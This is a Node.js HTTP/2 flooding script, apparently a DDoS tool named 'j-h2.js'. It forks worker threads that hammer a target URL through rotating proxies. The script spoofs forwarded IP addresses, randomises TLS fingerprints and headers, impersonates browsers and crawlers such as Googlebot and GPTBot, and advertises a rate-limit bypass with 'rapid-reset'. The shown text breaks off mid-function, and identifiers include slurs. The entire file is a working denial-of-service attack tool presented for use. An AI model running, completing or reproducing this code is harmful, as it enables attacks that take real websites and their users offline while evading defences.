const colors = require('colors');
const net = require("net");
const url = require('url');
const fs = require('fs');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const cluster = require('cluster');
const crypto = require('crypto');
const { v4: uuidv4 } = require('uuid');
const os = require("os");
const v8 = require('v8');

Array.prototype.shuffle = function () {
    return this.sort(() => Math.random() - 0.5);
};
Object.prototype.shuffle = function () {
    const object = {};
    Object.keys(this).shuffle().forEach(key => object[key] = this[key]);
    return object;
};

const block = [".", "-", "&"].join("");
let maprate = [];
const secureOptionsList = [
    crypto.constants.SSL_OP_NO_RENEGOTIATION,
    crypto.constants.SSL_OP_NO_TICKET,
    crypto.constants.SSL_OP_NO_SSLv2,
    crypto.constants.SSL_OP_NO_SSLv3,
    crypto.constants.SSL_OP_NO_COMPRESSION,
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
    crypto.constants.SSL_OP_TLSEXT_PADDING,
    crypto.constants.SSL_OP_ALL
];
const defaultCipherSuites = crypto.constants.defaultCoreCipherList.split(":");
const customCipherSuites = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    ...defaultCipherSuites
].join(":");
const pathii = [
    ".html", ".htm", ".css", ".js", ".jpg", ".jpeg", ".png", ".gif", ".svg",
    ".webp", ".woff", ".woff2", ".ttf", ".otf", ".eot", ".ico",
    ".json", ".xml", ".mp4", ".webm", ".ogg"
];
const randomPath = pathii[Math.floor(Math.random() * pathii.length)];
const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "ecdsa_secp384r1_sha384",
    "ecdsa_secp521r1_sha512",
    "rsa_pss_rsae_sha256",
    "rsa_pss_rsae_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha256",
    "rsa_pkcs1_sha384",
    "rsa_pkcs1_sha512"
].join(":");
function eko(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({
        length
    }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}
const ecdh = [
    "X25519",
    "P-256",
    "P-384",
    "P-521",
    "ffdhe2048",
    "ffdhe3072"
].join(":");
const sysgay = [
    "Macintosh",
    "Windows 1.01",
    "Windows 1.02",
    "Windows 1.03",
    "Windows 1.04",
    "Windows 2.01",
    "Windows 3.0",
    "Windows NT 3.1",
    "Windows NT 3.5",
    "Windows 95",
    "Windows 98",
    "Windows 2006",
    "Windows NT 4.0",
    "Windows 95 Edition",
    "Windows 98 Edition",
    "Windows Me",
    "Windows Business",
    "Windows XP",
    "Windows 7",
    "Windows 8",
    "Windows 10 version 1507",
    "Windows 10 version 1511",
    "Windows 10 version 1607",
    "Windows 10 version 1703"
];
const winarch = [
    "rv:40.0",
    "rv:41.0",
    "x86-16",
    "x86-16, IA32",
    "IA-32",
    "IA-32, Alpha, MIPS",
    "IA-32, Alpha, MIPS, PowerPC",
    "Itanium",
    "x86_64",
    "IA-32, x86-64",
    "IA-32, x86-64, ARM64",
    "x86-64, ARM64",
    "ARMv4, MIPS, SH-3",
    "ARMv4",
    "ARMv5",
    "ARMv7",
    "IA-32, x86-64, Itanium",
    "IA-32, x86-64, Itanium",
    "x86-64, Itanium"
];
const winch = [
    "Intel Mac OS X 10.9",
    "Intel Mac OS X 10.7",
    "Intel Mac OS X 10_10_3",
    "Intel Mac OS X 10_10_1",
    "Intel Mac OS X 10_10_4",
    "2012 R2",
    "Win 64",
    "2019 R2",
    "2012 R2 Datacenter",
    "Server Blue",
    "Longhorn Server",
    "Whistler Server",
    "Shell Release",
    "Daytona",
    "Razzle",
    "HPC 2008"
];
var nm2 = sysgay[Math.floor(Math.random() * sysgay.length)];
var nm3 = winarch[Math.floor(Math.random() * winarch.length)];
var nm5 = winch[Math.floor(Math.random() * winch.length)];
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
    cipher() { return defaultCipherSuites[Math.floor(Math.random() * defaultCipherSuites.length)]; },
    sigalgs() { return sigalgs.split(":")[Math.floor(Math.random() * sigalgs.split(":").length)]; },
    ecdh() { return ecdh.split(":")[Math.floor(Math.random() * ecdh.split(":").length)]; }
};
process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
}).setMaxListeners(0);

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
let rps = process.argv[6];

if (!target || !time || !thread || !proxyFile || !rps) {
    console.clear;
      console.log(`
Usage: node j-h2.js url time threads proxyfile rps [options] 
Option : --status true/false (show status code)
         --cookie true/false (enable/disable random cookie)
         --ratelimit true/false (enable/disable rate limit bypass && rapid--reset)
Note
`);
    process.exit(1);
}

if (!/^https?:\/\//i.test(target)) {
    process.exit(1);
}

let proxys = [];
try {
    const proxyData = fs.readFileSync(proxyFile, 'utf-8');
    proxys = proxyData.match(/\S+/g);
} catch (err) {
    process.exit(1);
}

if (isNaN(rps) || rps <= 0) {
    process.exit(1);
}

const proxyr = () => {
    return proxys[Math.floor(Math.random() * proxys.length)];
};

let randbyte = 1;
setInterval(() => {
    randbyte++;
}, 1000);

const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'application/json,text/html;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'application/json,application/xml;q=0.9,text/html;q=0.8,*/*;q=0.7',
    'application/json;q=0.9,application/xml;q=0.8,*/*;q=0.7',
    'text/plain;q=0.9,text/html;q=0.8,*/*;q=0.7',
    'application/pdf,text/html;q=0.8,*/*;q=0.7',
    'image/avif,image/webp,image/apng,image/png,image/jpeg,*/*;q=0.8',
    'text/html,application/xhtml+xml;q=0.8,image/avif,image/webp,*/*;q=0.7',
    'text/html,application/xhtml+xml;q=0.9,image/avif,image/webp,image/png,*/*;q=0.8',
    '*/*;q=0.8'
];
const language_header = [
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8'
];
const fetch_site = ["same-origin", "same-site", "cross-site", "none"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker"];
const encoding_header = ['gzip, deflate, br', 'compress, gzip', 'deflate, gzip', 'gzip, identity'];
function randomversion(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
const ver = randomversion(133, 135);
const usfi = [

    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
];
const mixua = [
                'TelegramBot (like TwitterBot)',
            'GPTBot/1.0 (+https://openai.com/gptbot)',
            'GPTBot/1.1 (+https://openai.com/gptbot)',
            'OAI-SearchBot/1.0 (+https://openai.com/searchbot)',
            'ChatGPT-User/1.0 (+https://openai.com/bot)',
            'Googlebot/2.1 (+http://www.google.com/bot.html)', 
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Googlebot-Image/1.0',
            'Googlebot-Video/1.0',
            'Googlebot-News/2.1', 
            'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/W.X.Y.Z Safari/537.36',
            'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z Mobile Safari/537.36 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Twitterbot/1.0',
            'Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)',
            'Slackbot',
            'Discordbot/2.0 (+https://discordapp.com)',
            'DiscordBot (private use)',
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
];
function randomFirefoxVersion() {
    return `${randomversion(133, 138)}.0`;
}
function randomOS() {
    const osOptions = [
        `Windows NT 10.0; Win64; x64`,
        `Macintosh; Intel Mac OS X 14_${randomversion(0, 4)}`,
        `X11; Linux x86_64`
    ];
    return osOptions[Math.floor(Math.random() * osOptions.length)];
}
function randomSecChUa() {
    const version = parseInt(randomFirefoxVersion());
    return `"Not A;Brand";v="8", "Chromium";v="${version}", "Firefox";v="${version}"`;
}
function randomSecChUaPlatform() {
    const os = randomOS();
    if (os.startsWith('Windows')) return '"Windows"';
    if (os.startsWith('Macintosh')) return '"macOS"';
    return '"Linux"';
}
const plat = [
    "\"Windows\"",
    "\"Linux\"",
    "\"Android\"",
    "\"iOS\"",
    "\"Mac OS\"",
    "\"iPadOS\"",
    "\"BlackBerry OS\"",
    "\"Firefox OS\""
];
const searchEngines = [
    'https://www.google.com',
    'https://www.bing.com',
    'https://search.yahoo.com',
    'https://www.duckduckgo.com',
    'https://www.baidu.com',
    'https://www.yandex.com',
    'https://www.ecosia.org',
    'https://www.qwant.com',
    'https://www.startpage.com',
    'https://www.ask.com'
];
const randomEngine = searchEngines[Math.floor(Math.random() * searchEngines.length)];
const urihost = [
    'google.com',
    'youtube.com',
    'facebook.com',
    'baidu.com',
    'wikipedia.org',
    'twitter.com',
    'amazon.com',
    'yahoo.com',
    'reddit.com',
    'netflix.com'
];
const ignoreList = ['apps', 'docs', 'rate-limit-test', 'rss'];
let statusCounts = {};

const countStatus = (status) => {
    if (!statusCounts[status]) {
        statusCounts[status] = 0;
    }
    statusCounts[status]++;
};

const printStatusCounts = () => {
    console.log(JSON.stringify(statusCounts));
    Object.keys(statusCounts).forEach(status => {
        statusCounts[status] = 0;
    });
};

function response(res) {
    const status = res[':status']
    countStatus(status)
}
function generateRandomString(minLength, maxLength) {
    const characters = 'aqwertyuiopsdfghjlkzxcvbnm';
    if (minLength > maxLength) {
        [minLength, maxLength] = [maxLength, minLength];
    }
    const length = minLength === maxLength ? minLength : Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}
function generateRandomStrings(minLength, maxLength) {
    const characters = 'aqwertyuiopsdfghjlkzxcvbnm';
    if (minLength > maxLength) {
        [minLength, maxLength] = [maxLength, minLength];
    }
    const length = minLength === maxLength ? minLength : Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}
const getUniqueHeaders = (function() {
    const adjectives = ['fast', 'quick', 'silent', 'noisy', 'bright', 'dark', 'calm', 'rough', 'smooth', 'fierce'];
    const nouns = ['eagle', 'tiger', 'lion', 'shark', 'wolf', 'panther', 'falcon', 'leopard', 'puma', 'cobra'];
    const suffixes = ['settings-', 'application-'];
    let pool = [];
    adjectives.forEach(adj => {
        nouns.forEach(noun => {
            suffixes.forEach(suffix => {
                pool.push(`${adj}-${noun}-${suffix}` + generateRandomString(5, 5));
            });
        });
    });
    pool.sort(() => Math.random() - 0.5);
    return function() {
        const shuffled = pool.slice().sort(() => Math.random() - 0.5);
        const selected = shuffled.slice(0, 3);
        const headers = {};
        selected.forEach(headerName => {
            const codeSnippet = `console.log('Header ${headerName}');`;
            const hexCode = Buffer.from(codeSnippet, 'utf8').toString('hex');
            headers[headerName] = hexCode;
        });
        return headers;
    };
})();
const argstos = process.argv.slice(2);
const queryIndextos = argstos.indexOf('--status');
const tos = queryIndextos !== -1 ? argstos[queryIndextos + 1] : null;
const queryIndexcoo = argstos.indexOf('--cookie');
const coo = queryIndexcoo !== -1 ? argstos[queryIndexcoo + 1] : null;
let cookie = '';
if (coo === "true") {
    cookie = `cache_push=${generateRandomString(30, 100)}; date=${Date.now()}`;
}
if (tos === 'true') {
    setInterval(printStatusCounts, 3000);
}
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
const interval = randomDelay(500, 1000);
const ip_spoof = () => {
    const getRandomByte = () => Math.floor(Math.random() * 255);
    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};
const ipsent = ['127.0.0.1', '192.168.3.100', '8.8.8.8'];
const ipsentdata = ipsent[Math.floor(Math.random() * ipsent.length)];
function getRandomPrivateIP() {
    const privateIPRanges = [
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16"
    ];
    const randomIPRange = privateIPRanges[Math.floor(Math.random() * privateIPRanges.length)];
    const ipParts = randomIPRange.split("/");
    const ipPrefix = ipParts[0].split(".");
    const subnetMask = parseInt(ipParts[1], 10);
    for (let i = 0; i < 4; i++) {
        if (subnetMask >= 8) {
            ipPrefix[i] = Math.floor(Math.random() * 256);
        } else if (subnetMask > 0) {
            const remainingBits = 8 - subnetMask;
            const randomBits = Math.floor(Math.random() * (1 << remainingBits));
            ipPrefix[i] &= ~(255 >> subnetMask);
            ipPrefix[i] |= randomBits;
            subnetMask -= remainingBits;
        } else {
            ipPrefix[i] = 0;
        }
    }
    return ipPrefix.join(".");
}
function getRandomUUID() {
    return uuidv4();
}
function generateLegitIP() {
    const asnData = [
        { asn: "AS15169", country: "US", ip: "8.8.8." },
        { asn: "AS8075", country: "US", ip: "13.107.21." },
        { asn: "AS14061", country: "SG", ip: "104.18.32." },
        { asn: "AS13335", country: "NL", ip: "162.158.78." },
        { asn: "AS16509", country: "DE", ip: "3.120.0." },
        { asn: "AS14618", country: "JP", ip: "52.192.0." },
        { asn: "AS32934", country: "US", ip: "157.240.0." },
        { asn: "AS54113", country: "US", ip: "104.244.42." },
        { asn: "AS15133", country: "US", ip: "69.171.250." }
    ];
    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}
const legitIP = generateLegitIP();
function randIPv4() {
    let address;
    do {
        const firstOctet = getRandomInt(1, 224);
        if (
            firstOctet === 0 ||
            firstOctet === 10 ||
            firstOctet === 100 ||
            firstOctet === 127 ||
            firstOctet === 169 ||
            firstOctet === 172 ||
            firstOctet === 192 ||
            firstOctet === 198 ||
            firstOctet === 203
        ) {
            continue;
        }
        if (firstOctet >= 224 && firstOctet <= 239) {
            continue;
        }
        address = firstOctet + '.' + getRandomInt(1, 256) + '.' + getRandomInt(1, 256) + '.' + getRandomInt(1, 256);
    } while (!address);
    return address;
}
const backoffStrategies = {
    async fixed(attempt) { await sleep(1000); },
    async linear(attempt) { await sleep(1000 * attempt); },
    async exponential(attempt) { await sleep(Math.min(10000, 500 * Math.pow(2, attempt))); },
    async exponentialJitter(attempt) { await sleep(Math.min(10000, 500 * Math.pow(2, attempt) * (0.5 + Math.random() * 0.5))); },
    async fibonacci(attempt) {
        let [a, b] = [0, 1];
        for (let i = 0; i < attempt; i++) [a, b] = [b, a + b];
        await sleep(Math.min(10000, 1000 * b));
    },
    async polynomial(attempt) { await sleep(Math.min(10000, 500 * Math.pow(attempt, 2))); },
    async retryAfter(attempt, retryAfter) { await sleep(retryAfter || 1000); }
};
const backoffConfig = {
    on429: ["fixed", "linear", "exponential", "exponentialJitter", "fibonacci", "polynomial", "retryAfter"],
    onRedirect: "fixed",
    onGoaway: "exponentialJitter"
};

async function applyBackoff(strategy, attempt, retryAfter = null) {
    if (Array.isArray(strategy)) {
        const selectedStrategy = strategy[Math.floor(Math.random() * strategy.length)];
        await backoffStrategies[selectedStrategy](attempt, retryAfter);
    } else {
        await backoffStrategies[strategy](attempt, retryAfter);
    }
}
if (cluster.isMaster) {
    for (let i = 0; i < thread; i++) {
        cluster.fork();
    }
    setTimeout(() => {
        process.exit(-1);
    }, time * 1000);
} else {
    async function floodLoop() {
        while (true) {
            await flood().catch(() => {});
            await new Promise(resolve => setImmediate(resolve));
        }
    }
    floodLoop().catch(() => {});
}
async function flood() {
    let parsed = url.parse(target);
    const currentTime = Date.now();
    maprate = maprate.filter(limit => currentTime - limit.timestamp <= 60000);
    let proxy;
    let attempt = 0;
    do {
        proxy = proxyr().split(':');
        if (!proxy[0] || !proxy[1]) {
            attempt++;
            continue;
        }
        if (!maprate.some(limit => limit.proxy === proxy[0] && (Date.now() - limit.timestamp) < 60000)) {
            break;
        }
        attempt++;
    } while (attempt < 10);
    if (attempt >= 10) {
        return;
    }
    const parseBoolean = (value) => value === "true";
    const getArgumentValue = (args, flag, defaultValue = null) => {
        const index = args.indexOf(flag);
        return index !== -1 ? args[index + 1] : defaultValue;
    };
    const bypassconnect = process.argv.slice(2);
    const spoofed = ip_spoof();
    const legitIP = generateLegitIP();
    const ratelimit0 = parseBoolean(getArgumentValue(bypassconnect, '--ratelimit', "false"));
    const post = getArgumentValue(process.argv.slice(7), '--post');
    const botua = getArgumentValue(process.argv.slice(7), '--bot');
    const query = getArgumentValue(process.argv.slice(7), '--query', null);
    const querylenght = getArgumentValue(process.argv.slice(7), '--lenght', "1-1");
    const redirect = parseBoolean(getArgumentValue(bypassconnect, "--redirect", false));
    const datalog = [
        {[eko(1,2)+'-x-fetch-site--sytnc'+eko(1,2)+'--'+eko(2,4)]: '-wp-context-'+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-x-fetch-mode--cdp'+eko(1,2)+'--'+eko(2,4)]: 'PK-'+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-x-fetch-user--ukn'+eko(1,2)+'--'+eko(2,4)]: '<atset>>'+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-x-fetch-dest--fo'+eko(1,2)+'--'+eko(2,4)]: '@ogani-'+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-accept-encoding--ufo'+eko(1,2)+'--'+eko(2,4)]: 'POOILER|POOI|'+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-accept-language--nigga'+eko(1,2)+'--'+eko(2,4)]: 'xpath-acc'+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-x-botnet-close--ca'+eko(1,2)+'--'+eko(2,4)]: "rendercaching"+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-x-session-floor--pp'+eko(1,2)+'--'+eko(2,4)]: 'YY&'+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-x-forwarded-for-data--'+eko(1,2)+'--'+eko(2,4)]: 'Underclass|'+eko(1,2)+'-'+eko(1,2)},
        {[eko(1,2)+'-cf-emty-log-'+eko(1,2)+'--'+eko(2,4)]: 'legit-gojection'+eko(1,2)+'-'+eko(1,2)}
    ];
    let usff = usfi[Math.floor(Math.random() * usfi.length)];
    let mixx = mixua[Math.floor(Math.random() * mixua.length)];
    let path = parsed.path;
    if (parsed.path.includes('%rand%')) {
        path = parsed.path.replace("%rand%", generateRandomString(5, 7));
    } else {
        setInterval(() => {
            path = parsed.path;
        }, 1000);
    }
    
async function reswritedata(request) {
    let size = bigRaw ? 256 * 1024 : 512 * 1024; 
    const chunkCount =  1;
    const chunkSize = Math.floor(size / chunkCount);

    const rawData = crypto.randomBytes(chunkSize);
    for (let i = 0; i < chunkCount; i++) {
        request.write(rawData);
    }
}
    let pathrr = "/" + generateRandomString(5, 7) + "/" + generateRandomString(5, 7) + randomPath;
    let chead = { cookie };
    let header = {
        "Sec-Ch-Ua": randomSecChUa(),
       "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": randomSecChUaPlatform(),
        ...(Math.random() < 0.5 ? { "purpose": "prefetch" } : {}),
       ...(Math.random() < 0.5 ? { "upgrade-insecure-requests": "1" } : {}),
        "User-Agent":  mixx,
        ...(Math.random() < 0.5 ? { "priority": "u=0, i" } : {}),
        "Accept": accept_header[Math.floor(Math.random() * accept_header.length)],
        "Accept-Encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
        "Accept-Language": language_header[Math.floor(Math.random() * language_header.length)],
        "Sec-Fetch-Site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
        "Sec-Fetch-Mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
         "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
        ...(Math.random() < 0.677897878878 ? { "Sec-Xdp-Floodgates": "bet-clc-" + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.365656 ? datalog[Math.floor(Math.random() * datalog.length)] : { "xyz-nel-navigator": "null" }),
        ...(Math.random() < 0.365654 ? datalog[Math.floor(Math.random() * datalog.length)] : { "xyz-connection-navigator": "type@wifi" }),
        ...(Math.random() < 0.3656546 ? datalog[Math.floor(Math.random() * datalog.length)] : { "tcp/ip=-protocol--/-/-/---": "not-/-/--smftp" }),
